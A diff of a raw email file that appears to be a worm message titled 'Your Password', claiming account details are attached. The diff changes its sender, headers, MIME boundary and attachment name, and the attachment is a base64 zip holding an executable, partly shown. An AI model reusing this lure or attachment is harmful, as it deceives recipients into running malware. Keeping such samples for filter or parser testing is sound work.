@@ -1,29 +1,29 @@
-From: info@aros.net
+From: hostmaster@wil.cx
 Subject: Your Password
-Date: Wed, 14 Dec 2005 06:52:14 GMT
-Message-ID: <ae30.295d4e36949e@aros.net>
+Date: Wed, 14 Dec 2005 08:28:05 UTC
+Message-ID: <81edea72.4dfc60fd476@wil.cx>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=3fae4a5b68f78a3fbb"
+Content-Type: multipart/mixed; boundary="======7f65761f8a510.02e"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: x-Recipient@oss.sgi.com
+To: XPost@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=3fae4a5b68f78a3fbb
+--======7f65761f8a510.02e
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.aros.net
-***** Email: postman@aros.net
---=3fae4a5b68f78a3fbb
-Content-Type: application/octet-stream; name=reg_pass.zip
+***** Go to: http://www.wil.cx
+***** Email: postman@wil.cx
+--======7f65761f8a510.02e
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=3fae4a5b68f78a3fbb--
+--======7f65761f8a510.02e--
